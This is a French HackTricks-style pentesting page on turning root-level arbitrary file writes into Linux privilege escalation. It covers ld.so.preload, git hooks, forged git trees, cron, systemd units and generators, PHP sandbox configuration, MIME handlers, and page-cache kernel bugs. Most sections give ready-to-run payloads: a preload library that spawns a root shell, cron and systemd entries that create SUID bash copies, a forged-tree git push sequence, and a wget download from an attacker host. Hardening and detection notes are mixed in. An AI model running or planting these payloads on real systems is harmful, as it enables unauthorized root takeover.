# Écriture arbitraire de fichiers en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` est une liste système d’objets partagés que l’éditeur de liens dynamique charge avant les autres objets partagés. Le mode d’exécution sécurisé impose des restrictions supplémentaires au préchargement ; un chemin de bibliothèque tel que `/tmp/pe.so` n’est donc pas une technique universelle pour les binaires SUID.\
Si vous pouvez créer ou modifier ce fichier, un processus qui le charge chargera la bibliothèque indiquée avant ses autres objets partagés, ce qui permet l’exécution de code dans le contexte de ce processus.<sup>[[12]](#references)</sup>

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

Les **Git hooks** sont des scripts exécutables lancés lors d’événements dans un dépôt, notamment les opérations de commit et de merge. Si un **script ou un utilisateur privilégié** effectue ces actions et qu’un attaquant peut **écrire dans le dossier `.git`**, le hook peut servir à une **élévation de privilèges**.<sup>[[13]](#references)</sup>

Par exemple, il est possible de **générer un script** dans **`.git/hooks`** d’un dépôt Git afin qu’il soit toujours exécuté lors de la création d’un nouveau commit :

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal lors de l'export d'un arbre Git avec privilèges élevés

Un synchroniseur privilégié peut éviter un checkout et énumérer à la place un dépôt influencé par un attaquant avec `git ls-tree`, lire chaque blob avec `git cat-file`, joindre le chemin indiqué à un répertoire de staging et écrire lui-même les fichiers. Cela devient une **arbitrary file write avec les privilèges du synchroniseur** lorsqu'il combine `-c safe.directory=*` (qui désactive la protection de Git contre les dépôts appartenant à un autre utilisateur) avec l'absence de vérification du confinement de la destination. Un nom d'entrée d'arbre absolu fait que `os.path.join(stage, name)` en Python ignore `stage` ; un nom relatif contenant `../` permet de s'en échapper lorsque le système de fichiers résout le chemin. Comme l'application matérialise l'arbre brut au lieu de demander à Git de le checkout, le rejet des chemins au moment du checkout ne protège jamais le sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Recherchez cette structure de code dans les services root, les timers, les agents de déploiement, les importateurs de templates et les tâches de sauvegarde/restauration :<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Une entrée d’arbre est encodée sous la forme `<mode> SP <name> NUL <raw object ID>`. L’option `git hash-object --literally` permet délibérément de créer des données d’objet que l’analyse normale ou `git fsck` peut rejeter ; un clone jetable peut donc créer un arbre dont le nom de fichier est une destination absolue. Cet exemple crée un blob de fichier cron, enveloppe l’arbre forgé dans un commit et déplace une branche vers celui-ci ; l’exploitation nécessite toujours d’avoir la permission de mettre à jour un dépôt utilisé par le job privilégié et que le serveur Git accepte l’objet malformé.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Le hardening doit couvrir à la fois l’ingestion du dépôt et l’opération finale sur le système de fichiers :<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Remplacez `safe.directory=*` par les dépôts exacts auxquels le service doit faire confiance et, dans la mesure du possible, traitez les dépôts sans privilèges root.
- Rejetez les noms absolus ainsi que tout composant `.` ou `..` avant la matérialisation. Après la concaténation des chemins, canonicalisez la destination et vérifiez qu’elle reste sous la racine prévue.
- Évitez les races symlink de type check-then-open : ouvrez les chemins relativement à un descripteur de répertoire fiable et, sous Linux, utilisez `openat2()` avec `RESOLVE_BENEATH` et `RESOLVE_NO_SYMLINKS` pour les chemins contrôlés par un attaquant.
- Préférez un checkout normal dans un répertoire isolé plutôt que de réimplémenter le checkout à partir de la sortie de plumbing. Si l’ingestion d’objets bruts est nécessaire, activez la validation côté réception, par exemple avec `receive.fsckObjects=true` ; ne rétrogradez pas les alertes `receive.fsck.*` liées aux noms de chemin, nécessaires pour rejeter les arbres forgés.

### Déploiement de configuration avec privilèges élevés

Certains services de gestion stockent l’état système souhaité dans un fichier de configuration, puis le déploient avec des privilèges élevés. Par exemple, [openmediavault stocke sa configuration dans `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), et son [interface RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) peut appliquer des changements de service. Si un compte moins privilégié peut écrire dans ce fichier ou le remplacer, vérifiez s’il peut aussi demander un déploiement autorisé et si le module sélectionné utilise le champ modifié en tant que root. Les clés de compte SSH, les commandes planifiées et l’installation de paquets ont chacune des prérequis différents ; la simple présence d’un fichier ou le fait qu’un fichier XML soit modifiable ne prouve rien de tout cela. Vérifiez les permissions du fichier et de son répertoire parent, les groupes de l’appelant et son autorisation RPC, la version installée ainsi que le composant qui utilise réellement le fichier, sans modifier la configuration ni lancer d’opération d’application pendant l’énumération.

Les définitions d’action Fail2Ban dans `/etc/fail2ban/action.d/` constituent une autre limite de configuration privilégiée. Un utilisateur capable d’écrire dans ce répertoire et d’y accéder peut éventuellement remplacer une définition d’action ou ajouter une surcharge, mais les permissions du répertoire ne suffisent pas à établir une exécution de code. Vérifiez qu’une jail activée sélectionne effectivement l’action concernée, que le service Fail2Ban l’exécute avec des privilèges supérieurs et qu’un rechargement/redémarrage autorisé suivi d’un événement de ban correspondant aura lieu. Une autorisation sudo sans rapport permettant de redémarrer Fail2Ban n’est pertinente que si elle s’applique à l’invocation exacte du service et que la définition modifiée est chargée. La [configuration des actions de Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) décrit le lien entre le répertoire des actions et les jails ; son [exemple d’action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) montre que `actionban` s’exécute lors d’un ban avec les droits de l’utilisateur du service. Examinez les permissions et la configuration effective sans modifier les actions ni déclencher de bans pendant l’énumération.

Une autre limite existe lorsqu’une jail Fail2Ban activée utilise une action mail enrichie par WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) concernait du texte WHOIS non fiable transmis à GNU mailutils `mail`, dont le traitement des caractères d’échappement pouvait exécuter une commande. Un utilisateur moins privilégié capable d’écrire dans un fichier peut influencer la réponse s’il peut modifier la configuration de remplacement du serveur du **client WHOIS sélectionné** ; le fichier [`whois.conf(5)` de Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) en est un exemple, mais son chemin et son utilisation varient selon l’installation. Vérifiez la jail/action effective, l’identité du service, le client WHOIS réellement utilisé et son chemin de configuration, l’implémentation de mail, le contrôle de la réponse ainsi que le correctif du fournisseur ou son backport installé. Un fichier de configuration WHOIS modifiable, une version de Fail2Ban ou une action mail ne suffisent pas à prouver cette chaîne ; évitez d’interroger un serveur externe ou de déclencher des bans pendant l’énumération passive.

### Création de fichiers TFTP et hooks de paquets privilégiés

Un service TFTP accessible peut franchir une limite de conteneur ou d’utilisateur local si les paramètres **effectifs** de tftpd-hpa le font fonctionner en tant que root, exposent la racine du système de fichiers comme répertoire `--secure` et activent `--create`. [Le manuel de tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) décrit les options de création et d’utilisateur. Cela peut permettre de créer un nouveau fichier dans un répertoire de configuration privilégié, notamment `/etc/apt/apt.conf.d/` ; le remplacement d’un fichier existant peut toutefois rester impossible. [Le manuel de configuration d’APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documente les commandes `APT::Update::Pre-Invoke`. Un `apt update` exécuté en tant que root peut devenir le composant qui exploite les privilèges supérieurs **uniquement s’il** lit le nouveau fichier de configuration. Vérifiez les arguments et l’identité réels du daemon en cours d’exécution, l’accessibilité réseau et le filtrage, les règles de création dans le répertoire cible, la portée effective de la configuration APT et une invocation ultérieure avec privilèges élevés. Un fichier par défaut, un répertoire cible modifiable ou une commande APT planifiée ne prouvent pas à eux seuls toute la chaîne. Le triage passif doit se limiter à lire les fichiers de configuration locale et les métadonnées, sans téléverser de fichier ni invoquer APT.

### Fichiers Cron et de temporisation

Si vous pouvez **écrire dans des fichiers liés à cron que root exécute**, vous pouvez généralement obtenir une exécution de code au prochain lancement de la tâche. Parmi les cibles intéressantes :<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Voies d’exploitation courantes :

- **Ajouter une nouvelle tâche cron root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Installer une backdoor dans une cible de timer existante** en modifiant le script ou le binaire qu’elle lance

Exemple minimal de payload cron :

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Si vous ne pouvez écrire que dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.<sup>[[15]](#references)</sup>
- Certains systèmes utilisent des timers `systemd` au lieu du cron classique, mais le principe d’exploitation reste le même : **modifier ce que root exécutera plus tard**.<sup>[[20]](#references)</sup>

### Fichiers Service & Socket

Si vous pouvez écrire des **fichiers unit `systemd`** ou des fichiers auxquels ils font référence, vous pouvez peut-être obtenir une exécution de code en tant que root en rechargeant et en redémarrant l’unité, ou en attendant que le mécanisme d’activation du service/socket se déclenche.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Vérifiez également les droits d’écriture et de recherche sur le répertoire des unités système lui-même, y compris les ACL : un utilisateur peut créer une nouvelle unité dans `/etc/systemd/system` même si la lecture ou l’énumération du répertoire lui est refusée. Ce chemin seul ne déclenche rien. Confirmez que le gestionnaire système chargera la nouvelle unité, que l’appelant dispose d’un droit effectif permettant d’exécuter `systemctl start` ou `restart` avec les privilèges root pour son nom (ou d’un autre mécanisme d’activation privilégié), et que le service s’exécute sous l’identité voulue. Une unité existante déjà chargée, modifiée sur disque, peut nécessiter `daemon-reload` ; le chargement d’une unité portant un nouveau nom obéit à des règles différentes. Examinez les arguments et exclusions exacts de sudo avant de considérer qu’une règle de redémarrage avec joker suffit. Consultez le [chemin de recherche des unités systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) et la [sémantique de chargement et de rechargement de systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Parmi les cibles intéressantes :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Les fichiers de remplacement (drop-in) dans `/etc/systemd/system/<unit>.d/*.conf`
- Les scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Les chemins `EnvironmentFile=` modifiables chargés par un service root

Vérifications rapides :

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Voies d’abus courantes :

- **Remplacer `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Ajouter un override drop-in** avec un `ExecStart=` malveillant et effacer d’abord l’ancien
- **Installer une backdoor dans le script/binaire** déjà référencé par l’unité
- **Détourner un service activé par socket** en modifiant le fichier `.service` correspondant, qui démarre lorsque le socket reçoit une connexion

Exemple d’override malveillant :

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Flux d’activation typique :

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unité activée par socket, il vous suffit peut-être **d’attendre une connexion client** pour déclencher l’exécution du service compromis en tant que root.<sup>[[17]](#references)</sup>

### Répertoires des générateurs systemd

Les **générateurs système** sont des exécutables lancés par le gestionnaire système avant le chargement des fichiers d’unités, au démarrage comme lors du rechargement de la configuration. Par conséquent, l’accès en écriture à un répertoire de générateurs système (ou à un générateur exécutable existant) permet directement l’exécution de code en tant que root. Ce vecteur est facile à manquer lorsqu’un audit vérifie uniquement les fichiers `*.service` et `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

L’ordre de recherche habituel est `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` et `/usr/lib/systemd/system-generators/` (certaines distributions exposent `/lib/systemd/system-generators/` via la fusion de `/usr`). Un exécutable portant le même nom dans un répertoire antérieur masque celui des répertoires suivants. Ne confondez pas ces **répertoires d’exécutables d’entrée** avec `/run/systemd/generator`, `/run/systemd/generator.early` et `/run/systemd/generator.late`, qui contiennent la sortie d’unités temporaires produite par les générateurs.<sup>[[35]](#references)</sup>

Vérifications rapides :

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Un générateur nouvellement créé doit avoir son bit d’exécution activé. Si la primitive d’écriture permet de contrôler les octets, mais pas le mode, ciblez un générateur déjà exécutable ; le tronquer sur place préserve généralement ses métadonnées. Si le répertoire lui-même est inscriptible, créez une nouvelle entrée et marquez-la comme exécutable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Déclencher `systemctl daemon-reload` sur le gestionnaire **system** nécessite une autorisation appropriée, mais relance tous les générateurs system ; sinon, attendez un rechargement avec privilèges, une opération sur les paquets ou un redémarrage. Les répertoires de générateurs utilisateur tels que `~/.config/systemd/user-generators/` s’exécutent sous le gestionnaire utilisateur et ne confèrent **pas** les privilèges root à eux seuls.<sup>[[35]](#references)</sup>

Pour le hardening et la détection, vérifiez chaque composant du chemin et les ACL, pas seulement les bits de mode finaux, établissez une référence des hashes et de la propriété des paquets des générateurs, et déclenchez des alertes en cas de création, renommage, modification de contenu ou de permissions dans tous les répertoires d’entrée des générateurs system. Il est important de surveiller les écritures, car un générateur à exécution unique peut se supprimer après son exécution, tandis que l’arborescence d’unités générées sous `/run/systemd/generator*` est reconstruite au prochain rechargement.<sup>[[35]](#references)[[36]](#references)</sup>

### Remplacer un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code sandboxé dispose encore d’**un quelconque primitive d’écriture** (comme `file_put_contents`) et que vous pouvez accéder au **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **remplacer cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Déroulement typique :

1. Le premier payload remplace la configuration du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Si le daemon s’exécute en tant que root (ou valide des chemins appartenant à root), la seconde exécution obtient un contexte root. Il s’agit essentiellement d’une **escalade de privilèges via l’écrasement de la configuration** lorsque l’environnement d’exécution sandboxé peut toujours écrire des fichiers.

### binfmt_misc

`binfmt_misc` expose les enregistrements sous `/proc/sys/fs/binfmt_misc` ; chaque enregistrement associe un motif de type de fichier à un interpréteur. L’impact sur les privilèges dépend de qui peut modifier l’enregistrement et du processus qui exécute ensuite le fichier correspondant. Vérifiez donc ces conditions avant de considérer cela comme une voie d’escalade de privilèges.<sup>[[21]](#references)</sup>

Un helper exécutable doté de `CAP_DAC_OVERRIDE` peut constituer une autre voie d’enregistrement s’il accepte des données contrôlées par l’appelant et les écrit dans `/proc/sys/fs/binfmt_misc/register`, même lorsque l’appelant ne peut pas écrire directement dans ce nœud. Examinez les entrées du helper et son comportement d’écriture sans l’exécuter pendant l’énumération. Si une règle enregistrée utilise le flag `C`, l’interpréteur reçoit des identifiants basés sur le binaire correspondant ; un exécutable correspondant appartenant à root et doté de SUID peut donc exécuter en tant que root un interpréteur contrôlé par l’appelant. Confirmez le montage et la politique d’enregistrement de `binfmt_misc`, la capacité effective du helper, la règle exacte et le chemin de l’interpréteur, la cible exécutable SUID, ainsi que l’éventuelle suppression de la transition SUID par `no_new_privs` ou un montage `nosuid`. Un bit de capacité ou une chaîne de chemin intégrée ne constitue qu’une piste à examiner.<sup>[[21]](#references)</sup> Consultez [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) pour connaître les conditions qui suppriment SUID.

### Écraser les gestionnaires de schémas (comme http: ou https:)

Les environnements de bureau utilisent les associations MIME et les entrées desktop pour choisir une application pour les schémas URI ; un attaquant capable d’écrire dans la configuration par utilisateur et les répertoires d’entrées desktop concernés peut rediriger ces schémas vers un lanceur qu’il contrôle. En modifiant le fichier `$HOME/.config/mimeapps.list` pour associer les gestionnaires d’URL HTTP et HTTPS à un fichier malveillant (par exemple, `x-scheme-handler/http=evil.desktop` et `x-scheme-handler/https=evil.desktop`), un clic de l’utilisateur peut invoquer cette entrée desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root qui exécute des scripts/binaires modifiables par l’utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n’importe quel binaire dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le hijack :<sup>[[1]](#references)</sup>

- **Détecter l’exécution :** surveillez les processus avec pspy pour repérer root exécutant des chemins contrôlés par l’utilisateur.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Vérifier que l’écriture est possible :** assurez-vous que le fichier cible et son répertoire appartiennent à votre utilisateur et que celui-ci peut y écrire.
- **Détourner la cible :** sauvegardez le binaire/script d’origine et déposez un payload qui crée un shell SUID (ou exécute toute autre action en tant que root), puis restaurez les permissions :

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Déclencher l’action privilégiée** (p. ex., en appuyant sur un bouton de l’interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell avec privilèges élevés via `./rootshell -p`.

### Modification de fichiers limitée au cache de pages des binaires privilégiés

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. Ils permettent plutôt de modifier uniquement la **copie dans le cache de pages** d’un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou autrement **exécuté par root**, la prochaine exécution peut lancer des octets contrôlés par l’attaquant depuis la mémoire et permettre une élévation de privilèges, même si le hash du fichier sur le disque reste inchangé.<sup>[[3]](#references)[[4]](#references)</sup>

Il est utile de considérer cela comme une **primitive d’écriture de fichier limitée à l’exécution** :<sup>[[3]](#references)</sup>

- **Le disque reste intact** : l’inode et les octets sur le disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page mise en cache obtiennent le contenu modifié par l’attaquant
- **L’effet est temporaire** : la modification disparaît après un redémarrage ou une éviction du cache

Cette primitive se situe entre l’**écriture arbitraire de fichier** classique et les anciens bugs d’**abus du cache de pages** comme Dirty COW / Dirty Pipe :<sup>[[3]](#references)</sup>

- Dirty COW reposait sur une race
- Dirty Pipe imposait des contraintes sur la position d’écriture
- Une primitive limitée au cache de pages peut être plus fiable si le chemin vulnérable permet d’écrire directement dans des pages mises en cache et adossées à un fichier

#### Flux générique de privesc

1. Obtenir une primitive kernel permettant d’écrire dans des **pages du cache de pages adossées à des fichiers**
2. L’utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l’exécution **avant** l’éviction de la page du cache
4. Obtenir l’exécution de code en tant que root, alors que le fichier sur le disque semble toujours inchangé

Cibles à forte valeur typiques :

- Binaires **setuid-root**
- Helpers lancés par des **services root**
- Binaires couramment exécutés depuis des **containers partageant le kernel / cache de pages de l’hôte**

#### Exemple de chemin AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette catégorie. Le chemin vulnérable se trouvait dans l’API crypto userspace de Linux (`AF_ALG` / `algif_aead`) :<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` peut déplacer des références vers des pages du cache de pages depuis un fichier lisible vers la scatterlist TX de crypto
- le chemin de déchiffrement `algif_aead` en place réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région de destination réservée au tag
- lorsque cette région référençait encore des pages adossées à un fichier et insérées par splice, l’écriture atterrissait dans le **cache de pages du fichier cible**

La technique intéressante n’est donc pas le CVE lui-même, mais le schéma :

- **injecter des pages du cache adossées à des fichiers dans un sous-système du kernel**
- faire en sorte que le sous-système les **traite comme une sortie inscriptible**
- déclencher une petite écriture contrôlée en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour modifier `/usr/bin/su` en mémoire, puis l’exécutait.<sup>[[4]](#references)[[7]](#references)</sup>

#### Exemple de chemin ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) montre une autre variante du même schéma d’**écriture vers root limitée au cache de pages**, mais cette fois le point d’entrée est le **déchiffrement IPsec ESP** plutôt que `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La technique importante est l’étape de **dissimulation des métadonnées** :

- `splice()` place une **page en lecture seule du cache de pages, adossée à un fichier**, dans un paquet ESP-in-UDP
- l’atténuation d’origine de DirtyFrag marquait ce skb avec `SKBFL_SHARED_FRAG` afin qu’`esp_input()` **copie les données avant de les déchiffrer**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence physique à la page du cache de pages**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et effectue un **déchiffrement `cbc(aes)` en place** sur la page adossée au fichier

La leçon pour les reviewers dépasse donc ce CVE : si une atténuation s’appuie sur les **métadonnées skb/page** pour déterminer si une opération doit d’abord effectuer une copie, tout **chemin de clonage/copie qui conserve la page sous-jacente mais abandonne les métadonnées** peut réactiver silencieusement la primitive d’écriture.

Flux d’exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un namespace réseau privé**
2. activer loopback et installer une règle **netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des SAs de transport XFRM ESP via `NETLINK_XFRM`
4. encoder chaque mot cible de 4 octets dans le champ `seq_hi` de la SA (l’astuce de sélection de mots de DirtyFrag)
5. envoyer le paquet ESP-in-UDP injecté par splice afin que le **clone TEE** atteigne `esp_input()` et soit déchiffré **en place**
6. répéter jusqu’à ce que la copie de `/usr/bin/su` ou d’un autre exécutable privilégié dans le cache de pages contienne du code contrôlé par l’attaquant

Sur le plan opérationnel, l’impact est identique à celui de l’exemple `AF_ALG` : le fichier sur le disque reste intact, mais `execve()` utilise les **octets modifiés du cache de pages** et donne root.<sup>[[8]](#references)[[9]](#references)</sup>

Vérifications utiles de l’exposition à cette variante :

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

La réduction de la surface d’attaque à court terme dépend aussi du chemin concerné : passer à un kernel intégrant `48f6a5356a33` corrige le chemin de clonage, tandis que bloquer l’autoload de `xt_TEE` supprime l’**étape de blanchiment des flags** et bloquer `esp4` / `esp6` supprime le **sink de déchiffrement**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposition et recherche de menaces

Si vous suspectez cette catégorie de bug, ne vous fiez pas uniquement aux vérifications d’intégrité du disque. Vérifiez également :

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Les valeurs de configuration ci-dessous distinguent une interface chargeable d’une interface intégrée au kernel ; les règles de compilation crypto associent `CONFIG_CRYPTO_USER_API_AEAD` à `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé/déchargé en tant que module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l’interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un accès local en root

#### Réduction de la surface d’attaque pour le chemin `algif_aead`

Si l’interface vulnérable est fournie par un module chargeable :<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

S'il est compilé dans le kernel, certaines divulgations ont signalé le blocage du chemin init avec :<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Ce type de mesure d’atténuation mérite aussi d’être gardé à l’esprit pour d’autres LPE du kernel : si l’exploitation dépend d’une interface facultative spécifique, désactiver ou blacklister cette interface peut bloquer le chemin d’exploitation avant même qu’une mise à niveau complète du kernel soit disponible.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – détourner un script exécuté par root dans un répertoire PaperCut accessible en écriture par un utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB : Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable : Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgation Openwall oss-security concernant CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif Linux stable : crypto: algif_aead - Revenir au fonctionnement hors place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — avis concernant CVE-2026-31431](https://copy.fail/)
- [7] [Analyse technique de Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Dépôt DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog : analyse et exploitation de la variante LPE Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correctif Linux : net: skb: préserver `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mesure d’atténuation Linux antérieure : définir `SKBFL_SHARED_FRAG` pour les paquets UDP splicé́s (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — page de manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — page de manuel Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
